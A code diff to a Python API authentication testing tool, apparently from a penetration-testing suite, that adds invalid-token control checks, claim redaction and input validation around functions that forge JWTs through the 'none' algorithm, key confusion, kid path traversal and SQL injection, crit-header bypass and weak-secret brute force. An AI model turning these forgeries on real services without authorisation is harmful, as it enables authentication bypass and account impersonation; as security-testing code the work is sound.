@@ -10,6 +10,7 @@ import base64
 import hashlib
 import hmac
 import json
+import math
 import re
 import time
 import urllib.request
@@ -55,22 +56,35 @@ def b64url_encode(data):
 def b64url_decode(data):
     """Base64url decode with padding fix."""
     if isinstance(data, str):
-        data = data.encode("utf-8")
+        data = data.encode("ascii")
+    if not isinstance(data, bytes) or not re.fullmatch(rb"[A-Za-z0-9_-]*", data):
+        raise ValueError("invalid base64url segment")
+    if len(data) % 4 == 1:
+        raise ValueError("invalid base64url length")
     padding = 4 - len(data) % 4
     if padding != 4:
         data += b"=" * padding
-    return base64.urlsafe_b64decode(data)
+    return base64.b64decode(data, altchars=b"-_", validate=True)
 
 
 def decode_jwt(token):
     """Decode a JWT token without verification."""
+    if not isinstance(token, str):
+        return None
     parts = token.split(".")
-    if len(parts) != 3:
+    if (
+        len(parts) != 3
+        or not parts[2]
+        and not re.fullmatch(r"[A-Za-z0-9_-]*", parts[2])
+        or parts[2] and not re.fullmatch(r"[A-Za-z0-9_-]+", parts[2])
+    ):
         return None
 
     try:
         header = json.loads(b64url_decode(parts[0]))
         payload = json.loads(b64url_decode(parts[1]))
+        if not isinstance(header, dict) or not isinstance(payload, dict):
+            return None
         return {
             "header": header,
             "payload": payload,
@@ -79,6 +93,27 @@ def decode_jwt(token):
         }
     except Exception:
         return None
+
+
+SENSITIVE_CLAIM_KEY = re.compile(
+    r"(?:password|passwd|secret|token|api[_-]?key|private[_-]?key|"
+    r"signing[_-]?key|jwk|authorization|cookie|"
+    r"credit.?card|cc.?number|ssn|social.?security|email|phone|mobile)",
+    re.IGNORECASE,
+)
+
+
+def redact_claim_values(value):
+    """Redact credential and personal-data claim values before report output."""
+    if isinstance(value, dict):
+        return {
+            key: "[REDACTED]" if SENSITIVE_CLAIM_KEY.search(str(key))
+            else redact_claim_values(item)
+            for key, item in value.items()
+        }
+    if isinstance(value, list):
+        return [redact_claim_values(item) for item in value]
+    return value
 
 
 def forge_jwt_none(payload, header_extra=None):
@@ -110,10 +145,41 @@ def forge_jwt_hs256(payload, secret, header_extra=None):
     return f"{h}.{p}.{s}"
 
 
-def test_jwt_none_bypass(decoded_jwt, test_url, extra_headers=None, delay=0):
+def invalid_jwt_control_status(test_url, extra_headers=None, delay=0):
+    """Return the response to a deliberately malformed token for comparison."""
+    headers = dict(extra_headers or {})
+    headers["Authorization"] = "Bearer invalid.invalid.invalid"
+    status, _, _ = http_request(test_url, headers=headers)
+    if delay:
+        time.sleep(delay)
+    return status
+
+
+def auth_probe_outcome(status, invalid_status):
+    """A 2xx is confirmed only when the same endpoint rejects an invalid token."""
+    if status not in (200, 201):
+        return None
+    return "confirmed" if invalid_status in (401, 403) else "candidate"
+
+
+def parse_delay(value):
+    try:
+        delay = float(value)
+    except (TypeError, ValueError) as exc:
+        raise argparse.ArgumentTypeError("delay must be a number") from exc
+    if not math.isfinite(delay) or not 0 <= delay <= 60:
+        raise argparse.ArgumentTypeError("delay must be finite and between 0 and 60 seconds")
+    return delay
+
+
+def test_jwt_none_bypass(
+    decoded_jwt, test_url, extra_headers=None, delay=0, invalid_status=None
+):
     """Test JWT none algorithm bypass."""
     log("Testing JWT 'none' algorithm bypass...")
     findings = []
+    if invalid_status is None:
+        invalid_status = invalid_jwt_control_status(test_url, extra_headers, delay)
 
     payload = decoded_jwt["payload"]
     for alg_name in ["none", "None", "NONE", "nOnE"]:
@@ -127,24 +193,37 @@ def test_jwt_none_bypass(decoded_jwt, test_url, extra_headers=None, delay=0):
         if delay:
             time.sleep(delay)
 
-        if status in (200, 201):
-            vuln(f"JWT 'none' algorithm bypass works with alg={alg_name}")
+        outcome = auth_probe_outcome(status, invalid_status)
+        if outcome:
+            confirmed = outcome == "confirmed"
+            message = (
+                f"JWT 'none' algorithm bypass works with alg={alg_name}"
+                if confirmed else
+                f"JWT 'none' algorithm candidate with alg={alg_name}; invalid-token control was not rejected"
+            )
+            (vuln if confirmed else log)(message)
             findings.append({
-                "type": "jwt_none_bypass",
-                "severity": "critical",
+                "type": "jwt_none_bypass" if confirmed else "jwt_none_bypass_candidate",
+                "severity": "critical" if confirmed else "info",
                 "algorithm_used": alg_name,
-                "forged_token": forged[:50] + "...",
                 "response_status": status,
+                "invalid_token_status": invalid_status,
+                "validated": confirmed,
             })
-            break
+            if confirmed:
+                break
 
     return findings
 
 
-def test_jwt_hs256_confusion(decoded_jwt, test_url, extra_headers=None, delay=0):
+def test_jwt_hs256_confusion(
+    decoded_jwt, test_url, extra_headers=None, delay=0, invalid_status=None
+):
     """Test RS256 to HS256 key confusion attack."""
     log("Testing RS256->HS256 key confusion...")
     findings = []
+    if invalid_status is None:
+        invalid_status = invalid_jwt_control_status(test_url, extra_headers, delay)
 
     original_alg = decoded_jwt["header"].get("alg", "")
     if original_alg not in ("RS256", "RS384", "RS512"):
@@ -173,17 +252,27 @@ def test_jwt_hs256_confusion(decoded_jwt, test_url, extra_headers=None, delay=0)
         if delay:
             time.sleep(delay)
 
-        if status in (200, 201):
-            vuln("RS256->HS256 key confusion attack successful!")
+        outcome = auth_probe_outcome(status, invalid_status)
+        if outcome:
+            confirmed = outcome == "confirmed"
+            message = (
+                "RS256->HS256 key confusion attack accepted"
+                if confirmed else
+                "RS256->HS256 key confusion candidate; invalid-token control was not rejected"
+            )
+            (vuln if confirmed else log)(message)
             findings.append({
-                "type": "jwt_key_confusion",
-                "severity": "critical",
+                "type": "jwt_key_confusion" if confirmed else "jwt_key_confusion_candidate",
+                "severity": "critical" if confirmed else "info",
                 "original_alg": original_alg,
                 "attack_alg": "HS256",
                 "key_used": key[:20] if key else "(empty)",
                 "response_status": status,
+                "invalid_token_status": invalid_status,
+                "validated": confirmed,
             })
-            break
+            if confirmed:
+                break
 
     return findings
 
@@ -194,7 +283,9 @@ KID_PATH_TRAVERSAL_SECRETS = [
 ]
 
 
-def test_jwt_kid_injection(decoded_jwt, test_url, extra_headers=None, delay=0):
+def test_jwt_kid_injection(
+    decoded_jwt, test_url, extra_headers=None, delay=0, invalid_status=None
+):
     """kid (Key ID) header injection: path traversal and SQL injection.
     research_notes/API breaker depth techniques/jwt_edge_cases.md -- when
     the server looks up the signing key by `kid` (as a filename or a DB
@@ -205,6 +296,8 @@ def test_jwt_kid_injection(decoded_jwt, test_url, extra_headers=None, delay=0):
     log("Testing JWT 'kid' header injection (path traversal + SQLi)...")
     findings = []
     payload = decoded_jwt["payload"]
+    if invalid_status is None:
+        invalid_status = invalid_jwt_control_status(test_url, extra_headers, delay)
 
     for traversal_path, expected_secret in KID_PATH_TRAVERSAL_SECRETS:
         forged = forge_jwt_hs256(payload, expected_secret, {"kid": traversal_path})
@@ -217,14 +310,24 @@ def test_jwt_kid_injection(decoded_jwt, test_url, extra_headers=None, delay=0):
         if delay:
             time.sleep(delay)
 
-        if status in (200, 201):
-            vuln(f"JWT 'kid' path traversal: {traversal_path!r} -> secret {expected_secret!r}")
+        outcome = auth_probe_outcome(status, invalid_status)
+        if outcome:
+            confirmed = outcome == "confirmed"
+            message = (
+                f"JWT 'kid' path traversal accepted for {traversal_path!r}"
+                if confirmed else
+                f"JWT 'kid' path traversal candidate for {traversal_path!r}; invalid-token control was not rejected"
+            )
+            (vuln if confirmed else log)(message)
             findings.append({
-                "type": "jwt_kid_path_traversal", "severity": "critical",
+                "type": "jwt_kid_path_traversal" if confirmed else "jwt_kid_path_traversal_candidate",
+                "severity": "critical" if confirmed else "info",
                 "kid_payload": traversal_path, "secret_used": expected_secret,
                 "response_status": status,
+                "invalid_token_status": invalid_status, "validated": confirmed,
             })
-            break
+            if confirmed:
+                break
 
     # UNION-based kid SQLi: tests whether the lookup is injectable at all by
     # forging against a secret the payload itself names -- this confirms
@@ -238,8 +341,15 @@ def test_jwt_kid_injection(decoded_jwt, test_url, extra_headers=None, delay=0):
     status, _, _ = http_request(test_url, headers=headers)
     if delay:
         time.sleep(delay)
-    if status in (200, 201):
-        vuln(f"JWT 'kid' SQL injection: payload={sqli_payload!r}")
+    outcome = auth_probe_outcome(status, invalid_status)
+    if outcome:
+        confirmed = outcome == "confirmed"
+        message = (
+            "JWT 'kid' lookup injection accepted"
+            if confirmed else
+            "JWT 'kid' lookup injection candidate; invalid-token control was not rejected"
+        )
+        (vuln if confirmed else log)(message)
         findings.append({
             # NOT "jwt_kid_sqli" -- import_findings.py's elif chain checks
             # "sqli" FIRST, before "jwt", so a type string containing both
@@ -248,9 +358,11 @@ def test_jwt_kid_injection(decoded_jwt, test_url, extra_headers=None, delay=0):
             # this finding's actual meaning (a JWT forgery primitive ->
             # authentication_bypass/impersonation). Caught by testing the
             # real chain end-to-end, not by inspecting the string by eye.
-            "type": "jwt_kid_lookup_injection", "severity": "critical",
+            "type": "jwt_kid_lookup_injection" if confirmed else "jwt_kid_lookup_injection_candidate",
+            "severity": "critical" if confirmed else "info",
             "kid_payload": sqli_payload, "secret_used": "knownsecret",
             "response_status": status,
+            "invalid_token_status": invalid_status, "validated": confirmed,
         })
 
     return findings
@@ -265,6 +377,8 @@ def test_jwt_kid_sqli_timing(decoded_jwt, test_url, extra_headers=None, delay=0,
     log("Testing JWT 'kid' header for time-based SQL injection...")
     findings = []
     payload = decoded_jwt["payload"]
+    if not math.isfinite(sleep_seconds) or not 1 <= sleep_seconds <= 10:
+        raise ValueError("sleep_seconds must be finite and between 1 and 10")
 
     baseline_token = forge_jwt_hs256(payload, "benign-kid-baseline", {"kid": "benign-key-id"})
     headers = {"Authorization": f"Bearer {baseline_token}"}
@@ -301,7 +415,9 @@ def test_jwt_kid_sqli_timing(decoded_jwt, test_url, extra_headers=None, delay=0,
     return findings
 
 
-def test_jwt_crit_header_bypass(decoded_jwt, test_url, extra_headers=None, delay=0):
+def test_jwt_crit_header_bypass(
+    decoded_jwt, test_url, extra_headers=None, delay=0, invalid_status=None
+):
     """RFC 7515 Section 4.1.11: a verifier MUST reject a JWT whose 'crit'
     header names an extension it doesn't understand/enforce. CVE-2026-32597
     (PyJWT) and CVE-2026-35042 (fast-jwt) both silently accepted such
@@ -315,6 +431,8 @@ def test_jwt_crit_header_bypass(decoded_jwt, test_url, extra_headers=None, delay
     log("Testing JWT 'crit' header non-enforcement (RFC 7515 Section 4.1.11)...")
     findings = []
     payload = decoded_jwt["payload"]
+    if invalid_status is None:
+        invalid_status = invalid_jwt_control_status(test_url, extra_headers, delay)
 
     control_token = forge_jwt_none(payload)
     control_headers = {"Authorization": f"Bearer {control_token}"}
@@ -338,18 +456,29 @@ def test_jwt_crit_header_bypass(decoded_jwt, test_url, extra_headers=None, delay
     if delay:
         time.sleep(delay)
 
-    if crit_status == control_status:
-        vuln("JWT 'crit' header not enforced -- unrecognized critical extension made no difference")
+    outcome = auth_probe_outcome(crit_status, invalid_status)
+    if control_status in (200, 201) and outcome:
+        confirmed = outcome == "confirmed"
+        message = (
+            "JWT 'crit' header not enforced -- unrecognized critical extension made no difference"
+            if confirmed else
+            "JWT 'crit' header candidate; invalid-token control was not rejected"
+        )
+        (vuln if confirmed else log)(message)
         findings.append({
-            "type": "jwt_crit_not_enforced", "severity": "medium",
+            "type": "jwt_crit_not_enforced" if confirmed else "jwt_crit_not_enforced_candidate",
+            "severity": "medium" if confirmed else "info",
             "crit_extension": "mythosTestExt",
             "control_status": control_status, "crit_status": crit_status,
+            "invalid_token_status": invalid_status, "validated": confirmed,
         })
 
     return findings
 
 
-def test_jwt_rs_ps_relabel(decoded_jwt, test_url, extra_headers=None, delay=0):
+def test_jwt_rs_ps_relabel(
+    decoded_jwt, test_url, extra_headers=None, delay=0, invalid_status=None
+):
     """RS256<->PS256 (and 384/512) confusion via pure header relabeling --
     zero new crypto, zero key material needed. Both share the same RSA key,
     so a verifier that dispatches on the literal 'alg' string into a
@@ -359,6 +488,8 @@ def test_jwt_rs_ps_relabel(decoded_jwt, test_url, extra_headers=None, delay=0):
     unchanged -- just a header swap and resend."""
     log("Testing JWT RS256<->PS256 relabeling...")
     findings = []
+    if invalid_status is None:
+        invalid_status = invalid_jwt_control_status(test_url, extra_headers, delay)
     original_alg = decoded_jwt["header"].get("alg", "")
     relabel_map = {"RS256": "PS256", "RS384": "PS384", "RS512": "PS512",
                     "PS256": "RS256", "PS384": "RS384", "PS512": "RS512"}
@@ -381,12 +512,21 @@ def test_jwt_rs_ps_relabel(decoded_jwt, test_url, extra_headers=None, delay=0):
     if delay:
         time.sleep(delay)
 
-    if status in (200, 201):
-        vuln(f"JWT {original_alg}<->{target_alg} relabeling accepted -- verifier dispatches on alg string alone")
+    outcome = auth_probe_outcome(status, invalid_status)
+    if outcome:
+        confirmed = outcome == "confirmed"
+        message = (
+            f"JWT {original_alg}<->{target_alg} relabeling accepted"
+            if confirmed else
+            f"JWT {original_alg}<->{target_alg} relabeling candidate; invalid-token control was not rejected"
+        )
+        (vuln if confirmed else log)(message)
         findings.append({
-            "type": "jwt_rs_ps_confusion", "severity": "high",
+            "type": "jwt_rs_ps_confusion" if confirmed else "jwt_rs_ps_confusion_candidate",
+            "severity": "high" if confirmed else "info",
             "original_alg": original_alg, "relabeled_alg": target_alg,
             "response_status": status,
+            "invalid_token_status": invalid_status, "validated": confirmed,
         })
 
     return findings
@@ -455,12 +595,16 @@ def check_jwt_cve_fingerprint(library, version):
     return hits
 
 
-def brute_force_jwt_secret(decoded_jwt, test_url, extra_headers=None, delay=0):
+def brute_force_jwt_secret(
+    decoded_jwt, test_url, extra_headers=None, delay=0, invalid_status=None
+):
     """Brute-force weak JWT secrets."""
     log(f"Brute-forcing JWT secret ({len(WEAK_SECRETS)} candidates)...")
     findings = []
 
     payload = decoded_jwt["payload"]
+    if invalid_status is None:
+        invalid_status = invalid_jwt_control_status(test_url, extra_headers, delay)
 
     for secret in WEAK_SECRETS:
         forged = forge_jwt_hs256(payload, secret)
@@ -473,14 +617,22 @@ def brute_force_jwt_secret(decoded_jwt, test_url, extra_headers=None, delay=0):
         if delay:
             time.sleep(delay)
 
-        if status in (200, 201):
-            vuln(f"JWT weak secret found: '{secret}'")
+        outcome = auth_probe_outcome(status, invalid_status)
+        if outcome:
+            confirmed = outcome == "confirmed"
+            message = (
+                f"JWT weak secret found: '{secret}'"
+                if confirmed else
+                "JWT weak-secret candidate; invalid-token control was not rejected"
+            )
+            (vuln if confirmed else log)(message)
             findings.append({
-                "type": "jwt_weak_secret",
-                "severity": "critical",
+                "type": "jwt_weak_secret" if confirmed else "jwt_weak_secret_candidate",
+                "severity": "critical" if confirmed else "info",
                 "secret": secret,
-                "forged_token": forged[:50] + "...",
                 "response_status": status,
+                "invalid_token_status": invalid_status,
+                "validated": confirmed,
             })
             break
 
@@ -516,17 +668,30 @@ def test_api_key_positions(base_url, api_key, endpoints=None, delay=0):
     ]
 
     for url in test_urls[:5]:
+        control_status, _, _ = http_request(url)
+        if delay:
+            time.sleep(delay)
         for pos_name, headers in positions:
             status, _, body = http_request(url, headers=headers)
             if delay:
                 time.sleep(delay)
-            if status in (200, 201):
-                success(f"API key accepted at {pos_name} for {url}")
+            outcome = auth_probe_outcome(status, control_status)
+            if outcome:
+                confirmed = outcome == "confirmed"
+                message = (
+                    f"API key accepted at {pos_name} for {url}"
+                    if confirmed else
+                    f"API key position candidate at {pos_name}; unauthenticated control was not rejected"
+                )
+                (success if confirmed else log)(message)
                 findings.append({
-                    "type": "api_key_position",
+                    "type": "api_key_position" if confirmed else "api_key_position_candidate",
+                    "severity": "high" if confirmed else "info",
                     "position": pos_name,
                     "url": url,
                     "status": status,
+                    "control_status": control_status,
+                    "validated": confirmed,
                 })
 
         for pos_name, param in query_positions:
@@ -539,19 +704,29 @@ def test_api_key_positions(base_url, api_key, endpoints=None, delay=0):
             status, _, body = http_request(test_url)
             if delay:
                 time.sleep(delay)
-            if status in (200, 201):
-                success(f"API key accepted at {pos_name} for {url}")
+            outcome = auth_probe_outcome(status, control_status)
+            if outcome:
+                confirmed = outcome == "confirmed"
+                message = (
+                    f"API key accepted at {pos_name} for {url}"
+                    if confirmed else
+                    f"API key position candidate at {pos_name}; unauthenticated control was not rejected"
+                )
+                (success if confirmed else log)(message)
                 findings.append({
-                    "type": "api_key_position",
+                    "type": "api_key_position" if confirmed else "api_key_position_candidate",
+                    "severity": "high" if confirmed else "info",
                     "position": pos_name,
                     "url": url,
                     "status": status,
+                    "control_status": control_status,
+                    "validated": confirmed,
                 })
 
     return findings
 
 
-def test_no_auth_access(base_url, endpoints, delay=0):
+def test_no_auth_access(base_url, endpoints, delay=0, auth_token=None, extra_headers=None):
     """Test endpoints accessible without authentication."""
     log("Testing for endpoints accessible without authentication...")
     findings = []
@@ -566,6 +741,15 @@ def test_no_auth_access(base_url, endpoints, delay=0):
             continue
         url = scoped_url
 
+        authenticated_headers = dict(extra_headers or {})
+        if auth_token:
+            authenticated_headers["Authorization"] = f"Bearer {auth_token}"
+        auth_status = None
+        if authenticated_headers:
+            auth_status, _, _ = http_request(url, headers=authenticated_headers)
+            if delay:
+                time.sleep(delay)
+
         status, _, body = http_request(url)
         if delay:
             time.sleep(delay)
@@ -574,14 +758,19 @@ def test_no_auth_access(base_url, endpoints, delay=0):
             # Check if there's actual data
             has_data = len(body) > 50
             if has_data:
-                vuln(f"No auth required: {url} (status={status}, len={len(body)})")
+                log(
+                    f"No-auth access candidate: {url} returned data without authentication; "
+                    "endpoint sensitivity and intended access were not established"
+                )
                 findings.append({
-                    "type": "no_auth_required",
-                    "severity": "high",
+                    "type": "no_auth_required_candidate",
+                    "severity": "info",
                     "url": url,
                     "status": status,
                     "response_length": len(body),
                     "response_preview": body[:200],
+                    "authenticated_status": auth_status,
+                    "validated": False,
                 })
 
     return findings
@@ -661,7 +850,7 @@ def analyze_jwt_claims(decoded_jwt):
         findings.append({
             "type": "jwt_privilege_claims",
             "severity": "info",
-            "claims": privilege_claims,
+            "claims": redact_claim_values(privilege_claims),
         })
 
     return findings
@@ -674,7 +863,7 @@ def main():
     parser.add_argument("--output", "-o", help="Output JSON file")
     parser.add_argument("--token", help="Auth token (JWT or API key) to analyze")
     parser.add_argument("--cookie", help="Session cookie")
-    parser.add_argument("--delay", type=float, default=0, help="Delay between requests (seconds)")
+    parser.add_argument("--delay", type=parse_delay, default=0, help="Delay between requests (0-60 seconds)")
     parser.add_argument("--library", help="JWT library name, if known (e.g. from recon/error leakage), for the static CVE fingerprint check")
     parser.add_argument("--library-version", help="JWT library version string, for the static CVE fingerprint check")
     parser.add_argument("--skip-kid-timing", action="store_true",
@@ -729,8 +918,8 @@ def main():
         if decoded:
             success("Token identified as JWT")
             jwt_info = {
-                "header": decoded["header"],
-                "payload": decoded["payload"],
+                "header": redact_claim_values(decoded["header"]),
+                "payload": redact_claim_values(decoded["payload"]),
                 "algorithm": decoded["header"].get("alg", "unknown"),
             }
             log(f"  Algorithm: {jwt_info['algorithm']}")
@@ -743,31 +932,46 @@ def main():
             # Pick a test URL
             test_url = endpoints[0] if endpoints else base_url
             if test_url:
+                invalid_status = invalid_jwt_control_status(
+                    test_url, extra_headers, args.delay
+                )
                 # Test none algorithm bypass
-                none_findings = test_jwt_none_bypass(decoded, test_url, extra_headers, args.delay)
+                none_findings = test_jwt_none_bypass(
+                    decoded, test_url, extra_headers, args.delay, invalid_status
+                )
                 all_findings.extend(none_findings)
 
                 # Test key confusion
-                confusion_findings = test_jwt_hs256_confusion(decoded, test_url, extra_headers, args.delay)
+                confusion_findings = test_jwt_hs256_confusion(
+                    decoded, test_url, extra_headers, args.delay, invalid_status
+                )
                 all_findings.extend(confusion_findings)
 
                 # RS256<->PS256 relabeling (zero new crypto, pure header swap)
-                relabel_findings = test_jwt_rs_ps_relabel(decoded, test_url, extra_headers, args.delay)
+                relabel_findings = test_jwt_rs_ps_relabel(
+                    decoded, test_url, extra_headers, args.delay, invalid_status
+                )
                 all_findings.extend(relabel_findings)
 
                 # kid header injection: path traversal + SQLi
-                kid_findings = test_jwt_kid_injection(decoded, test_url, extra_headers, args.delay)
+                kid_findings = test_jwt_kid_injection(
+                    decoded, test_url, extra_headers, args.delay, invalid_status
+                )
                 all_findings.extend(kid_findings)
                 if not args.skip_kid_timing:
                     kid_timing_findings = test_jwt_kid_sqli_timing(decoded, test_url, extra_headers, args.delay)
                     all_findings.extend(kid_timing_findings)
 
                 # crit header non-enforcement (differential vs the none-alg bypass)
-                crit_findings = test_jwt_crit_header_bypass(decoded, test_url, extra_headers, args.delay)
+                crit_findings = test_jwt_crit_header_bypass(
+                    decoded, test_url, extra_headers, args.delay, invalid_status
+                )
                 all_findings.extend(crit_findings)
 
                 # Brute-force weak secrets
-                bf_findings = brute_force_jwt_secret(decoded, test_url, extra_headers, args.delay)
+                bf_findings = brute_force_jwt_secret(
+                    decoded, test_url, extra_headers, args.delay, invalid_status
+                )
                 all_findings.extend(bf_findings)
 
             if args.library:
@@ -789,7 +993,9 @@ def main():
 
     # Test no-auth access
     if endpoints:
-        noauth_findings = test_no_auth_access(base_url, endpoints[:30], args.delay)
+        noauth_findings = test_no_auth_access(
+            base_url, endpoints[:30], args.delay, args.token, extra_headers
+        )
         all_findings.extend(noauth_findings)
 
     # Categorize findings
